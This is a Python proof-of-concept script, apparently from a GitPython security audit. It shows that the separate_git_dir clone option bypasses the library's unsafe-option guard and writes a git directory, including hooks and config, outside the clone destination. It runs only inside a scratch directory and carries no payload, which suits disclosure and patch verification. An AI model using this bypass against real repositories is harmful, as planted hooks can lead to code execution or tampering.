#!/usr/bin/env python3
"""
GITPYTHON-001 PoC: Repo.clone_from(separate_git_dir=...) is not in
unsafe_git_clone_options, so it reaches `git clone` unguarded and writes a
full git directory (config, hooks/, objects/, refs/, ...) to an
attacker-controlled path OUTSIDE the intended destination directory, with
allow_unsafe_options left at its default of False.

Run against the GitPython source tree under test, e.g.:
  PYTHONPATH="<repo>:<repo>/gitdb:<repo>/smmap" python3 gitpython-001-poc.py <workdir>

Benign: only writes/reads inside the given workdir. No destructive/exfiltrating
payload. Exits non-zero and prints "NOT VULNERABLE" if the guard blocks the option
or the write does not escape the destination directory.
"""
import os
import sys
import subprocess


def main():
    workdir = sys.argv[1] if len(sys.argv) > 1 else "/tmp/gitpython-001-poc"
    src = os.path.join(workdir, "src")
    dest = os.path.join(workdir, "dest")
    sentinel_dir = os.path.join(workdir, "OUTSIDE_SENTINEL")
    target_gitdir = os.path.join(sentinel_dir, "redirected.git")

    for p in (src, dest, sentinel_dir):
        os.makedirs(p, exist_ok=True)

    # Minimal benign source repo to clone from.
    subprocess.run(["git", "init", "-q", "-b", "main", src], check=True)
    subprocess.run(["git", "-C", src, "config", "user.email", "test@example.com"], check=True)
    subprocess.run(["git", "-C", src, "config", "user.name", "Test"], check=True)
    with open(os.path.join(src, "file.txt"), "w") as f:
        f.write("hello\n")
    subprocess.run(["git", "-C", src, "add", "file.txt"], check=True)
    subprocess.run(["git", "-C", src, "commit", "-q", "-m", "init"], check=True)

    import git  # gitpython under test

    print("unsafe_git_clone_options =", git.Repo.unsafe_git_clone_options)
    assert "--separate-git-dir" not in git.Repo.unsafe_git_clone_options, (
        "guard now includes --separate-git-dir; PoC no longer applicable, target patched"
    )

    try:
        repo = git.Repo.clone_from(src, dest, separate_git_dir=target_gitdir)
    except git.exc.UnsafeOptionError as e:
        print("NOT VULNERABLE: blocked by UnsafeOptionError:", e)
        sys.exit(1)

    wrote_outside = os.path.isdir(os.path.join(target_gitdir, "hooks")) and os.path.isfile(
        os.path.join(target_gitdir, "config")
    )
    gitlink_points_outside = False
    with open(os.path.join(dest, ".git")) as f:
        gitlink = f.read().strip()
        gitlink_points_outside = target_gitdir in gitlink

    print("repo.git_dir =", repo.git_dir)
    print("wrote git directory outside dest (sentinel) =", wrote_outside)
    print("dest/.git gitlink points outside dest =", gitlink_points_outside)

    if wrote_outside and gitlink_points_outside:
        print("VULNERABLE: git directory created at attacker-controlled path "
              f"outside the clone destination: {target_gitdir}")
        sys.exit(0)
    else:
        print("NOT VULNERABLE: sentinel not observed")
        sys.exit(1)


if __name__ == "__main__":
    main()
